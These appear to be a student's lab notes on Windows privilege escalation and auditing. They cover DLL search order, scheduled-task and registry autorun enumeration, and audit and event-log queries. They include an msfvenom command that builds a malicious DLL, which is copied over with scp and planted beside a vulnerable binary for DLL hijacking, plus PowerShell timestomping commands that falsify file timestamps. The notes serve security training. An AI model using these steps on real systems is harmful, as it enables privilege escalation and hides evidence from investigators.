DLL Hijacking
      reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"
       
      the DLL is not found the program will check the following locations, in order:
      
      The directory the the Application was run from (current working directory)
              The exact location on the hard drive where the program was executed from. Even locations such as C:\Users\Public\Downloads
      
      The directory specified in in the C+ function GetSystemDirectory() 
              The returned location is C:\Windows\system32 even on 64 bit systems.
      
      The directory specified in the C+ function GetWindowsDirectory()
              The returned location should always be C:\Windows
          
      The current directory
              The current directory assuming the application was executed using its full path.

Windows Integrity Mechanism
      six possible integrity levels:
        Untrusted - Anonymous SID access tokens
        Low - Everyone SID access token (World)
        Medium - Authenticated Users
        High - Administrators
        System - system services (LocalSystem, LocalService, NetworkService)
        Installer - Used by setup programs to install software.
    
AutoElevate executables
          The following are methods that will show AutoElevate settings for an executable
          
          sigcheck:
          (Get-Command calc.exe).Path
          sigcheck -m C:\WINDOWS\system32\calc.exe
          
          strings:
          (Get-Command calc.exe).Path
          strings C:\WINDOWS\system32\calc.exe
          
          notepad:
          (Get-Command calc.exe).Path
          notepad C:\WINDOWS\system32\calc.exe

Scheduled Tasks and Services

    The following commands can be used to idenitfy vulnerable tasks using CMD and PowerShell:
        schtasks /query /fo LIST /v

            List all Tasks in List format
        schtasks /query /fo LIST /v | Select-String -Pattern "STRING OR REGEX PATTERN"

            Select-String can utilize regex to output only values that match
        schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive -Context 0,6

            Searches for Task To Run and outputs that line, along with the 6 lines following it in order to show the Run As User setting too.
        schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive |Select-String -Pattern "COM handler" -NotMatch

            Excludes results that we dont want to seein order to help narrow down vulnerable directory locations
        Open and view tasks from the Task Scheduler GUI Application

    Identify the following vulnerable Task:
        C:\Users\student\exercise_2\putty.exe

    Run: sigcheck c:\users\student\exercise_2\putty.exe
        Determines information we can use to research for vulnerabilities

    Run: icacls "c:\users\student\exercise_2"
        Check if the directory can be written to, as it is non-standard

The Windows registry includes the following four keys:
    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce

Audit Logging

auditpol /get /category:*
    # Basic: Shows all audit category setting

auditpol /get /category:* |findstr /i "success failure"
    # Show all audit category set for success, failure, or success and fail

auditpol /list /subcategory:"detailed Tracking","DS Access"
    # Displays sub policy's for "Detailed Tracking","DS Access" categories.

auditpol /get /option:crashonauditfail
    # Check options that effect the system as a whole when certain events occur. The example would cause the system to crash if auditing would become unable to log events.

DEMO: Event Logging

        wevtutil el
            # Show all logs on system, more logs exist other than event logging.
        
        wevtutil qe security /c:5 /rd:true /f:text
            # Show last 5 security logs.
        
        wevtutil gl microsoft-windows-audit/analytic
            # Configuration information for the specified log, which includes whether the log is enabled or not, the current maximum size limit of the log, and the path to the file where the log is stored.
        
        wevtutil qe system /c:5 /rd:false /f:text /q:"*[System[(EventID=104 or EventID=7040)]]"
            # Case sensitive, Show last 5 events that are EventID104 or 7040.
        
        wmic nteventlog list /format
            # Show configuration of eventlogs.
        
        wmic nteventlog get name
            # Show eventlog logs by name.
        
        wmic ntevent where "logfile="security" list full
            # Grabs all security logs
        
        wmic ntevent where "logfile="security and eventcode=4647" get category,insertionstrings
            # Display security eventID 4647 with category and insertionstrings data.
        
        Get-EventLog -?
            # help, shows command structure.
        
        Get-Eventlog -List
            # Displays all the logs.
        
        Get-EventLog security -newest 1 -instanceid 4672 \| format-list
            # Newest log with instanceid 4672
        
        Get-EventLog -LogName Security -Newest 50 \| Select Timegenerated,  @{Name="edwards";Expression={ $_.ReplacementStrings[1]}}, EventID, index \| format-list
            # Show events in security made by edwards username.
        
        Get-EventLog -LogName Security -Newest 50 -index 5399 \| format-list
            # Display newest 50 with index 5399 from Security log.

Powershell Logging
        reg query [hklm or hkcu]\software\microsoft\powershell\1\powershellengine\
    # Hive check to determine PowerShell verison and log settings

        reg query [hklm or hkcu]\software\microsoft\powershell\3\powershellengine\
    # PowerShell hive check

Checking *Windows Management Instrumentation Command (WMIC) logging
        reg query hklm\software\microsoft\wbem\cimom \| findstr /i logging

dir /A /o:d /t:w
    # Sorts files from oldest to newest by file write time. Newest files will be at the end of the output.

forfiles /P c:\windows\system32 /S /D +05/14/2019
    # Recursively lists the directory and sub directories matching the specified modified time criteria
    # /S subdir recursively
    # /D last modified time (+ greater than equal to)

dir /O:D /T:W /A:-D
    # /O:D List by files in sorted order
    # /T:W will make the command use file modified time
    # /A:-D will make it to print only files.

wmic datafile where name='c:\\windows\\system32\\notepad.exe' get CreationDate, LastAccessed, LastModified
    # Pulls the three specified dates from the identified file

copy /b filename.ext +,,
    # Sets the date to the current time

Get-ChildItem -path c:\windows\system32
    # List all files within a directory

Get-ChildItem c:\windows\system32 -Force | Select-Object FullName, CreationTime, LastAccessTime, LastWriteTime, Mode, Length
    # Lists all files within a directory along with there timestamps and permissions

$(Get-Item file.ext).creationtime=$(date) |$(Get-Item test.txt).creationtime=$(Get-Date)
    # Sets the date for today

$(Get-Item file.ext).lastaccesstime=$(date) |$(Get-Item test.txt).lastaccesstime=$(Get-Date "07/07/2004")
    # Sets the date specified

$(Get-Item file.ext).lastwritetime=$(date) |$(Get-Item test.txt).lastwritetime=$(Get-Date "07/07/2004 05:18 am")
    # Sets the date and time as specified

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                                                                DEMO 
Task Scheduler, find a file
Go to file directory 
write to file check by making new test.txt

tasklist /svc | findstr "putty"

DLL HIJACK
We need to find what DLLS the binary is calling
ProcMon
filter
process name contains <.exe>
path contains .dll
result contains NAME NOT FOUND
the run <.exe>

msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\<user>\Desktop\whoami.exe' -f dll > SSPICLI.dll

Windows command prompt:
scp student@linuxip:/home/student/SSPICLI.dll .
scp student@linuxip:/home/student/putty.exe .
make old putty, and place the new one in the same folder, view whoami.txt




Regedit
Look in HKLM AND HKCU
